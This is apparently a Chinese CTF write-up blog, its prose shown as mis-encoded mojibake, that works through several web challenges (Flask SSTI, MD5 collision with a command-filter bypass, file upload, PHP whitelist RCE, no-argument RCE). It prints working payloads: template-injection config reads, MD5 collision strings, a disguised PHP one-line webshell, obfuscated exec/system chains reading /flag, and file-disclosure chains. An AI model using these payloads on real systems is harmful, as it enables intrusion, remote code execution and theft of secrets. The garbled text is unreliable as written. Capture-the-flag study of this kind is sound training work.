å¯ä»¥çœ‹åˆ°/shrine/è·¯å¾„ä¸‹å­˜åœ¨å¯¹ç”¨æˆ·è¾“å…¥åˆ°æ¨¡æ¿æ•°æ®çš„è¿‡æ»¤ï¼Œ(ã€)è¢«æ›¿æ¢ä¸ºç©ºï¼Œconfigã€selféƒ½è¢«é»‘åå•è¿‡æ»¤æ‰ï¼Œä½†æ˜¯è¿˜æ˜¯é¿å…ä¸äº†å­˜åœ¨SSTIï¼Œå…ˆæ‹¿ä¸€ä¸ªæ•°å­¦è¡¨è¾¾å¼æµ‹è¯•ä¸€ä¸‹ï¼š2ï¼Œå‘ç°å¯ä»¥æ‰§è¡Œã€‚æ¥ç€çœ‹ä»£ç ï¼Œ app.config['FLAG'] = os.environ.pop('FLAG') è¿™é‡Œæ³¨å†Œä¸€ä¸ªåä¸ºFLAGçš„configï¼Œflagåº”è¯¥å°±åœ¨è¿™ï¼Œè¿™ä¸ªåœ°æ–¹åŸæœ¬å¯ä»¥ç›´æ¥é€šè¿‡è¯»å–æ‰€æœ‰app.configçš„å†…å®¹çš„ï¼Œä½†æ˜¯å‰é¢è¯´è¿‡configå·²ç»è¢«è¿‡æ»¤äº†ï¼šä¸‹é¢è¿™è¡Œä»£ç å°±æ˜¯å°†configå’Œselfæ›¿æ¢ä¸ºç©ºã€‚ return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) ä½†æ˜¯è¿™é‡Œé»‘åå•è¿‡æ»¤çš„å†…å®¹æ¯”è¾ƒå°‘ï¼Œå…¶å®è¿˜æœ‰å…¶ä»–å†…ç½®å‡½æ•°èƒ½å®ç°åŒæ ·çš„åŠŸèƒ½ï¼Œå¦‚url_forå’Œget_flashed_messageså…³äºè¿™ä¸¤ä¸ªå‡½æ•°å¯ä»¥å‚è€ƒï¼šhttps://www.jianshu.com/p/bcf57a3092ce è§£é¢˜ç›´æ¥ä¸Špayloadäº† /shrine/{{url_for.__globals__['current_app'].config}}/shrine/{{get_flashed_messages.__globals__['current_app'].config}} è¯»å–åˆ°flagå¦‚ä¸‹ï¼šPHPä¸­ä¹Ÿæœ‰å¾ˆå¤šæ¨¡æ¿æ¸²æŸ“çš„æ¼æ´ï¼Œä»¥åé‡åˆ°äº†æ…¢æ…¢å­¦å§ã€‚é™„ä¸Šä¸€ä¸ªæ¨¡æ¿æ³¨å…¥ç‚¹æ‰«æå·¥å…·tplmap [å®‰æ´µæ¯ 2019]easy_webè€ƒå¯Ÿå¤šæ¬¡ç¼–ç ï¼ŒMD5å¼ºç¢°æ’ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®ä¹‹åï¼Œçœ‹é¢˜ç›®çš„urlå‘ç°äº†å¯ç–‘çš„å‚æ•°imgå’Œcmdï¼Œå¹¶ä¸”imgçš„å€¼æ˜¯ä¸€ä¸²base64ï¼Œè§£ç ä¹‹åè¿˜æ˜¯base64ï¼Œå†è§£ç æ‹¿åˆ°ä¸€ä¸²hexç ï¼Œæœ€ç»ˆè§£ç æ˜¯555.pngï¼Œè¿™å°±è¯´æ˜ï¼Œè¯»å–æ–‡ä»¶çš„æ—¶å€™æ˜¯å…ˆè¿›è¡Œhexç¼–ç ï¼Œç„¶åä¸¤æ¬¡base64ç¼–ç ä¼ å‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹å°±å¯ä»¥è¯»å…¶ä»–æ–‡ä»¶äº†ã€‚å…ˆçœ‹index.phpçš„å†…å®¹ï¼Œä¸‰æ¬¡ç¼–ç ä¼ å‚ä¹‹åæ‹¿åˆ°æºç ï¼š &lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header('content-type:text/html;charset=utf-8');$cmd = $_GET['cmd'];if (!isset($_GET['img']) || !isset($_GET['cmd'])) header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=');$file = hex2bin(base64_decode(base64_decode($_GET['img'])));$file = preg_replace(\"/[^a-zA-Z0-9.]+/\", \"\", $file);if (preg_match(\"/flag/i\", $file)) { echo '&lt;img src =\"./ctf3.jpeg\"&gt;'; die(\"xixiï½ no flag\");} else { $txt = base64_encode(file_get_contents($file)); echo \"&lt;img src='data:image/gif;base64,\" . $txt . \"'&gt;&lt;/img&gt;\"; echo \"&lt;br&gt;\";}echo $cmd;echo \"&lt;br&gt;\";if (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|&lt;|&gt;/i\", $cmd)) { echo(\"forbid ~\"); echo \"&lt;br&gt;\";} else { if ((string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])) { echo `$cmd`; } else { echo (\"md5 is funny ~\"); }}?&gt;&lt;html&gt;&lt;style&gt; body{ background:url(./bj.png) no-repeat center center; background-size:cover; background-attachment:fixed; background-color:#CCCCCC;}&lt;/style&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; å¯ä»¥çœ‹åˆ°preg_match(&quot;/flag/i&quot;, $file)è¯´æ˜flagåœ¨/flagä¸­ï¼ŒåŒæ—¶ preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|&lt;|&gt;/i\", $cmd) å¯¹cmdä¼ å‚å†…å®¹è¿›è¡Œäº†å¾ˆå¤šçš„è¿‡æ»¤ï¼Œå¯ä»¥çœ‹åˆ°catè¢«banäº†ï¼Œä½†æ˜¯å¯¹\\ç”¨äº†\\\\æ¥è¿‡æ»¤ï¼Œä¹‹å‰æ‰“æ¯”èµ›é‡åˆ°è¿‡ï¼Œè¿™æ ·åŒ¹é…å…¶å®åŒ¹é…ä¸åˆ°\\ï¼Œå› æ­¤å¯ä»¥å€ŸåŠ©ca\\tæ¥ç»•è¿‡ï¼Œè¿™é‡Œå…¶å®è¿˜å¯ä»¥ç”¨sortå‘½ä»¤æ¥è¯»å–flagçš„ã€‚ sortï¼šsortå°†æ–‡ä»¶çš„æ¯ä¸€è¡Œä½œä¸ºä¸€ä¸ªå•ä½ï¼Œç›¸äº’æ¯”è¾ƒï¼Œæ¯”è¾ƒåŸåˆ™æ˜¯ä»é¦–å­—ç¬¦å‘åï¼Œä¾æ¬¡æŒ‰ASCIIç å€¼è¿›è¡Œæ¯”è¾ƒï¼Œæœ€åå°†ä»–ä»¬æŒ‰å‡åºè¾“å‡ºã€‚ å…¶å®Linuxä¸­å¯¹å‘½ä»¤è¿‡æ»¤çš„ç»•è¿‡æ–¹å¼è¿˜å¾ˆå¤šï¼Œå‚è€ƒè¿™é‡Œ å¦ä¸€ä¸ªè€ƒç‚¹æ˜¯MD5å¼ºæ¯”è¾ƒç»•è¿‡ï¼š if ((string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])) { echo `$cmd`;} è¿™é‡Œæ˜¯å›ºå®šç”¨æ³•ï¼š a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 å…¶å®åŸç†æ˜¯ç”Ÿæˆä¸¤ä¸ªtxtæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹åªæœ‰å‡ ä½ä¸åŒï¼Œä½†æœ€åçš„md5å€¼æ˜¯ç›¸åŒçš„ã€‚ è§£é¢˜åˆ©ç”¨cmdä¼ å‚sort%20/flagæˆ–ca\\t%20/flagå³å¯ï¼Œå½“ç„¶c\\atæ•ˆæœä¸€æ ·ï¼Œè¿™ä¸linuxçš„å‘½ä»¤ç›¸å…³ï¼Œæœ€åæ‹¿åˆ°flagã€‚å·¨å‘ï¼å¦‚æœæƒ³è¦ç”¨BPæŠ“åŒ…æ”¹POSTçš„å†…å®¹ï¼Œwebç«¯ä¸€å®šæ˜¯è¦POSTä¼ æ•°æ®ï¼Œä¸èƒ½GETä¼ å‚ä¹‹åæŠ“åŒ…å†æ”¹æˆPOSTï¼Œå¦åˆ™å¤±è´¥ï¼ [æå®¢å¤§æŒ‘æˆ˜ 2019]Uploadå¸¸è§„æ–‡ä»¶ä¸Šä¼ é¢˜ï¼Œå¯¹åç¼€åè¿›è¡Œäº†è¿‡æ»¤ï¼Œä¸€èˆ¬ç”¨phpã€php3ã€php4ã€php5ã€phtmlã€phtæ¥ç»•è¿‡ï¼Œæœ¬é¢˜æ˜¯åˆ©ç”¨phtç»•è¿‡çš„ã€‚æœ¬é¢˜ä¹Ÿå¯¹&lt;?è¿›è¡Œäº†è¿‡æ»¤ï¼Œåˆ©ç”¨GIF89a &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt;å³å¯ã€‚ è§£é¢˜ä¸Šä¼ æ„é€ å¥½çš„å°é©¬ï¼ŒæŠ“åŒ…ä¹‹åæŠŠæ–‡ä»¶ç±»å‹æ”¹ä¸ºimage/jpgä¸Šä¼ ä¹‹åå³å¯æˆåŠŸè§£æå°é©¬å­˜åœ¨äº†/uploadè·¯å¾„ä¸‹ï¼Œèšå‰‘è¿æ¥æ‹¿flagã€‚ [CISCN 2019]Love Mathä¸»è¦è€ƒå¯ŸPHPåŸºæœ¬å‡½æ•°çš„åˆ©ç”¨ï¼Œè¿˜æœ‰å˜é‡ä¸å‡½æ•°å…³è”çš„çŸ¥è¯† è¡¥å……çŸ¥è¯†ä¸€äº›åŸºæœ¬çš„å‡½æ•°ï¼š scandir()å‡½æ•°ï¼šè¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚base_convert()å‡½æ•°ï¼šåœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—ã€‚dechex()å‡½æ•°ï¼šæŠŠåè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶ã€‚hex2bin()å‡½æ•°ï¼šæŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸º ASCII å­—ç¬¦ã€‚var_dump()å‡½æ•°:ç”¨äºè¾“å‡ºå˜é‡çš„ç›¸å…³ä¿¡æ¯ã€‚readfile()å‡½æ•°ï¼šè¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚è¯¥å‡½æ•°è¯»å…¥ä¸€ä¸ªæ–‡ä»¶å¹¶å†™å…¥åˆ°è¾“å‡ºç¼“å†²ã€‚è‹¥æˆåŠŸï¼Œåˆ™è¿”å›ä»æ–‡ä»¶ä¸­è¯»å…¥çš„å­—èŠ‚æ•°ã€‚è‹¥å¤±è´¥ï¼Œåˆ™è¿”å›falseã€‚æ‚¨å¯ä»¥é€šè¿‡@readfile()å½¢å¼è°ƒç”¨è¯¥å‡½æ•°ï¼Œæ¥éšè—é”™è¯¯ä¿¡æ¯ã€‚ åŠ¨æ€å‡½æ•° phpä¸­å¯ä»¥æŠŠå‡½æ•°åé€šè¿‡å­—ç¬¦ä¸²çš„æ–¹å¼ä¼ é€’ç»™ä¸€ä¸ªå˜é‡ï¼Œç„¶åé€šè¿‡æ­¤å˜é‡åŠ¨æ€è°ƒç”¨å‡½æ•°ä¾‹å¦‚ï¼š$function = &quot;sayHello&quot;;$function(); phpä¸­å‡½æ•°åé»˜è®¤ä¸ºå­—ç¬¦ä¸² ä¾‹å¦‚æœ¬é¢˜ç™½åå•ä¸­çš„asinhå’Œpiå¯ä»¥ç›´æ¥å¼‚æˆ–ï¼Œè¿™å°±å¢åŠ äº†æ„é€ å­—ç¬¦çš„é€‰æ‹©. é¢˜ç›®åˆ†ææ‰“å¼€è¿æ¥ï¼Œç»™å‡ºäº†æºç ï¼š &lt;?phperror_reporting(0);//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flagif(!isset($_GET['c'])){ show_source(__FILE__);}else{ //ä¾‹å­ c=20-1 $content = $_GET['c']; if (strlen($content) &gt;= 80) { die(\"å¤ªé•¿äº†ä¸ä¼šç®—\"); } $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $content)) { die(\"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦\"); } } //å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(\"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°\"); } } //å¸®ä½ ç®—å‡ºç­”æ¡ˆ eval('echo '.$content.';');} åˆ†ææºç å¯çŸ¥ï¼Œå¯¹å‚æ•°å†…å®¹ä½œäº†ä»¥ä¸‹çš„é™åˆ¶ï¼š 1ã€é•¿åº¦ä¸èƒ½è¶…è¿‡80ï¼› 2ã€ä¸èƒ½åŒ…å«,\\t,\\r,\\n,',&quot;,åå¼•å·,[,`]`` è¿™äº›å­—ç¬¦ï¼› 3ã€ä¸èƒ½æœ‰ä¸æ˜¯$whitelistç™½åå•é‡Œé¢çš„å­—ç¬¦ä¸²å‡ºç°ï¼› å•å•ä¼ å‚cè‚¯å®šæ˜¯ä¸è¡Œäº†ï¼Œæœ‰ä¸¤ç§æ€è·¯æ¥æ‹¿flagï¼šåŠ ä¸€ä¸ªå‚æ•°ï¼šæˆ‘ä»¬éœ€è¦æ„é€ ä¸ª$_GET[1]ï¼Œç„¶åå†æ‹¿flagï¼Œä½†æ˜¯[ã€]éƒ½ä¸èƒ½ç”¨ï¼Œå› æ­¤ä¸èƒ½ç›´æ¥æ„é€ ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ç™½åå•ä¸­çš„é‚£äº›å‡½æ•°æ¥æ„é€ ã€‚ç›´æ¥cat flagï¼šä¹Ÿéœ€è¦ç”¨åˆ°ä¸Šé¢è¯´çš„ä¸€äº›å‡½æ•°æ¥æ„é€ ã€‚ä¸»è¦ç”¨åˆ°base_convertã€dechexä¸¤ä¸ªå‡½æ•°ï¼ŒåŒæ—¶å°†piã€abså½“åšå‚æ•°æ¥åˆ©ç”¨ã€‚ è§£é¢˜åŠ å‚æ•°æ„é€ &amp;_GETä¼ å‚ï¼špayload 1ï¼š $pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat /flagbase_convert(37907361743,10,36) =&gt; \"hex2bin\"dechex(1598506324) =&gt; \"5f474554\"$pi=hex2bin(\"5f474554\") =&gt; $pi=\"_GET\" //hex2binå°†ä¸€ä¸²16è¿›åˆ¶æ•°è½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²($$pi){pi}(($$pi){abs}) =&gt; ($_GET){pi}($_GET){abs} //{}å¯ä»¥ä»£æ›¿[] ä½†æ˜¯è¿™ç§æ–¹æ³•ä¼šæŠ¥400 Bad Requestï¼Œå¯èƒ½è·Ÿæ„é€ çš„&amp;_GETç›¸å…³ï¼Œç½‘ä¸Šå‚è€ƒåˆ°ä¸èƒ½&amp;_GETä¼ å‚ï¼Œå¯ä»¥ç”¨headeræ¥ä¼ ï¼Œå¯ä»¥æ„é€ å¦‚ä¸‹ï¼špayload 2 $pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})base_convert(696468,10,36) =&gt; \"exec\"$pi(8768397090111664438,10,30) =&gt; \"getallheaders\"exec(getallheaders(){1})//æ“ä½œxxå’Œyyï¼Œä¸­é—´ç”¨é€—å·éš”å¼€ï¼Œechoéƒ½èƒ½è¾“å‡ºecho xx,yy è¿™é‡Œç”¨åˆ°äº†apacheä¸‹çš„getallheadersè¿™ä¸ªå‡½æ•°ï¼šæˆ‘ä»¬ç»“åˆè¿™ä¸ªpayloadï¼ŒæŠ“åŒ…ä¹‹ååœ¨å…¶ä¸­æ·»ä¸Š1: cat /flag(è¿™é‡Œéœ€è¦æ³¨æ„ä¸€ä¸‹ï¼ŒBUUçš„flagéƒ½åœ¨æ ¹ç›®å½•ä¸‹ï¼Œç›´æ¥cat /flagå³å¯ï¼Œç½‘ä¸Šä¸€äº›å‚è€ƒé¢˜è§£æ˜¯cat flag.phpæ˜¯è¯»ä¸åˆ°çš„)ï¼Œæ‹¿åˆ°flagï¼š ç›´æ¥æ„é€ æ‹¿cat /flag//exec('hex2bin(dechex(109270211257898))') =&gt; exec('cat f*')($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))//system('cat'.dechex(16)^asinh^pi) =&gt; system('cat *')base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))è¿™ä¸¤æ¡æ˜¯å‚è€ƒç½‘ä¸Šçš„é¢˜è§£ï¼Œæ²¡æœ‰åšå‡ºæ›´æ”¹ï¼Œç”¨çš„è¯ç¨å¾®æ”¹ä¸€ä¸‹å³å¯ [GXYCTF2019]ç¦æ­¢å¥—å¨ƒè€ƒå¯Ÿæ— å‚æ•°RCEï¼Œå‚è€ƒè¿™ç¯‡æ–‡ç«  é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®åªæœ‰ä¸€å¥flagåœ¨å“ªï¼Ÿå…¶å®æœ‰ç‚¹æ— ä»ä¸‹æ‰‹ï¼Œå‚è€ƒç½‘ä¸Šçš„é¢˜è§£æç¤ºæ˜¯gitæ³„éœ²ï¼Œä½†æ˜¯ç”¨githackæ²¡è·‘å‡ºæ¥ï¼Œæœ€åè¿˜æ˜¯ç”¨gitextractè·‘å‡ºæ¥äº†æºç ï¼š(githackå¾—æ›´æ–°äº†â€¦) &lt;?phpinclude \"flag.php\";echo \"flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;\";if(isset($_GET['exp'])){ if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) { if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) { if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) { // echo $_GET['exp']; @eval($_GET['exp']); } else{ die(\"è¿˜å·®ä¸€ç‚¹å“¦ï¼\"); } } else{ die(\"å†å¥½å¥½æƒ³æƒ³ï¼\"); } } else{ die(\"è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼\"); }}// highlight_file(__FILE__);?&gt; æˆ‘ä»¬éœ€è¦ç”¨expä¼ å‚ï¼Œä½†æ˜¯å‚æ•°ä¼šç»è¿‡ä¸‰å±‚æ­£åˆ™åŒ¹é…çš„è¿‡æ»¤ï¼šç¬¬ä¸€å±‚ï¼š preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp']) è¿™ä¸€å±‚è¿‡æ»¤äº†å¸¸ç”¨çš„PHPä¼ªåè®®ç¬¬äºŒå±‚ï¼š if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) è¿™ä¸€å±‚çš„åŒ¹é…æ˜æ˜¾æç¤ºæˆ‘ä»¬æ˜¯æ— å‚æ•°RCEï¼Œå…¶ä¸­çš„?Ræ˜¯é€’å½’åœ°è¿›è¡ŒåŒ¹é…ç¬¬ä¸‰æ¬¡ï¼š if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) è¿‡æ»¤æ‰å¸¸è§çš„å…³é”®å­—ã€‚ç›´æ¥getflagä¸ç°å®äº†ï¼Œé‚£å°±æƒ³åŠæ³•åˆ©ç”¨å‡½æ•°æ¥è·å–ã€‚ è§£é¢˜é¦–å…ˆéœ€è¦è·å–å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå¯ä»¥å®ç°çš„å‡½æ•°æœ‰scandir(.)(.è¡¨ç¤ºå½“å‰ç›®å½•)ï¼Œä½†æ˜¯.åˆä¸èƒ½ç”¨ï¼Œæ­¤æ—¶æƒ³åˆ°localeconv()ï¼šå‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚æ•°ç»„çš„ç¬¬ä¸€é¡¹å°±æ˜¯.è¿™æ—¶å†å€ŸåŠ©current()/pos()è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚ä¹Ÿå°±æ˜¯è¯´current(localeconv())å°±æ˜¯.äº†ã€‚payloadå¦‚ä¸‹ï¼š /?exp=print_r(scandir(current(localeconv())));/?exp=print_r(scandir(pos(localeconv()))); å¯ä»¥çœ‹åˆ°flag.phpåœ¨ç¬¬å››ä¸ªæ•°ç»„å…ƒç´ ä¸­ï¼Œè¯»å–å®ƒçš„æºç å°±èƒ½æ‹¿åˆ°flagã€‚å¦‚ä½•è¯»å–å€’æ•°ç¬¬äºŒä¸ªæ•°ç»„å…ƒç´ å‘¢ï¼Ÿ è¿™é‡Œæœ‰ä¸‰ç§æ–¹æ³•ï¼š1ã€array_reverse()ä»¥ç›¸åçš„é¡ºåºè¿”å›æ•°ç»„å…ƒç´ ï¼Œå†ç»“åˆå‡½æ•°next()å³å¯ã€‚è¿™é‡Œæ„é€ payloadï¼š /?exp=print_r(next(array_reverse(scandir(current(localeconv()))))); æ•ˆæœå¦‚ä¸‹ï¼š2ã€array_rand()å’Œarray_flip()array_flip()äº¤æ¢æ•°ç»„çš„é”®å’Œå€¼ï¼›array_rand()ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒï¼Œä¸æ–­åˆ·æ–°è®¿é—®å°±ä¼šä¸æ–­éšæœºè¿”å›ï¼Œæœ¬é¢˜ç›®ä¸­scandir()è¿”å›çš„æ•°ç»„åªæœ‰5ä¸ªå…ƒç´ ï¼Œåˆ·æ–°å‡ æ¬¡å°±èƒ½åˆ·å‡ºæ¥flag.phpã€‚æ„é€ payloadï¼š /?exp=print_r(array_rand(array_flip(scandir(current(localeconv()))))); æ•ˆæœå¦‚ä¸‹ï¼š3ã€session_id(session_start())session_start()å¯åŠ¨æ–°ä¼šè¯æˆ–è€…é‡ç”¨ç°æœ‰ä¼šè¯ï¼›session_id()è·å–åˆ°å½“å‰çš„session id;æœ¬é¢˜ç›®è™½ç„¶banäº†hexå…³é”®å­—ï¼Œå¯¼è‡´hex2bin()è¢«ç¦ç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å¹¶ä¸ä¾èµ–äºåå…­è¿›åˆ¶è½¬ASCIIçš„æ–¹å¼ï¼Œå› ä¸ºflag.phpè¿™äº›å­—ç¬¦æ˜¯PHPSESSIDæœ¬èº«å°±æ”¯æŒçš„ã€‚è¿™é‡Œä½¿ç”¨sessionä¹‹å‰éœ€è¦é€šè¿‡session_start()å‘Šè¯‰PHPä½¿ç”¨sessionï¼Œphpé»˜è®¤æ˜¯ä¸ä¸»åŠ¨ä½¿ç”¨sessionçš„ã€‚ç„¶ååˆ©ç”¨session_id()è·å–åˆ°å½“å‰çš„session idã€‚æˆ‘ä»¬å†åœ¨headerä¸­è®¾ç½®PHPSESSIDçš„cookieï¼Œå€¼å°±ä¸ºflag.phpï¼Œæ•ˆæœå¦‚ä¸‹ï¼š æœ€åå¦‚ä½•è·å–æºç å‘¢ï¼Ÿå› ä¸ºetè¢«banï¼Œæ‰€ä»¥å¯ä»¥ç”¨readfile()æˆ–highlight_file()ä»¥åŠå…¶åˆ«åå‡½æ•°show_source()ï¼Œç»“åˆå‡ ç§æ–¹æ³•ï¼Œæœ€ç»ˆæ„é€ ä¸‹åˆ—payloadï¼š /?exp=readfile(next(array_reverse(scandir(current(localeconv())))));/?exp=show_source(next(array_reverse(scandir(current(localeconv())))));/?exp=show_source(session_id(session_start())); //é…åˆBPä½¿ç”¨... è‡ªå·±ç»„åˆå§ æ‹¿åˆ°flagï¼š [SUCTF 2019]EasyWebè€ƒå¯Ÿçš„çŸ¥è¯†æœ‰ç‚¹æ‚ï¼Œä¸»è¦æ¶‰åŠæ„é€ ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshellã€æ–‡ä»¶ä¸Šä¼ ç»•è¿‡ã€ç»•è¿‡open_basedir/disable_functionçŸ¥è¯†é‡æœ‰ç‚¹å¤§ï¼Œå¥½å¥½è®°å½•ä¸€ä¸‹ã€‚ çŸ¥è¯†æ‹“å±•æ„é€ ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshellé¦–å…ˆï¼Œæ˜ç¡®æ€è·¯ã€‚æˆ‘çš„æ ¸å¿ƒæ€è·¯æ˜¯ï¼Œå°†éå­—æ¯ã€æ•°å­—çš„å­—ç¬¦ç»è¿‡å„ç§å˜æ¢ï¼Œæœ€åèƒ½æ„é€ å‡ºa-zä¸­ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚ç„¶åå†åˆ©ç”¨PHPå…è®¸åŠ¨æ€å‡½æ•°æ‰§è¡Œçš„ç‰¹ç‚¹ï¼Œæ‹¼æ¥å¤„ä¸€ä¸ªå‡½æ•°åï¼Œå¦‚assertï¼Œç„¶ååŠ¨æ€æ‰§è¡Œä¹‹å³å¯ã€‚é‚£ä¹ˆï¼Œå˜æ¢æ–¹æ³• å°†æ˜¯è§£å†³æœ¬é¢˜çš„è¦ç‚¹ã€‚ ä¸è¿‡åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘éœ€è¦è¯´è¯´php5å’Œ7çš„å·®å¼‚ã€‚ php5ä¸­assertæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡$f='assert';$f(...);è¿™æ ·çš„æ–¹æ³•æ¥åŠ¨æ€æ‰§è¡Œä»»æ„ä»£ç ã€‚ ä½†php7ä¸­ï¼Œassertä¸å†æ˜¯å‡½æ•°ï¼Œå˜æˆäº†ä¸€ä¸ªè¯­è¨€ç»“æ„ï¼ˆç±»ä¼¼evalï¼‰ï¼Œä¸èƒ½å†ä½œä¸ºå‡½æ•°ååŠ¨æ€æ‰§è¡Œä»£ç ï¼Œæ‰€ä»¥åˆ©ç”¨èµ·æ¥ç¨å¾®å¤æ‚ä¸€ç‚¹ã€‚ä½†ä¹Ÿæ— éœ€è¿‡äºæ‹…å¿ƒï¼Œæ¯”å¦‚æˆ‘ä»¬åˆ©ç”¨file_put_contentså‡½æ•°ï¼ŒåŒæ ·å¯ä»¥ç”¨æ¥getshellã€‚ä»¥ä¸Šå‚è€ƒPç¥çš„åšå®¢ã€‚è¿™é‡Œä»‹ç»ä¸‰ç§æ„é€ 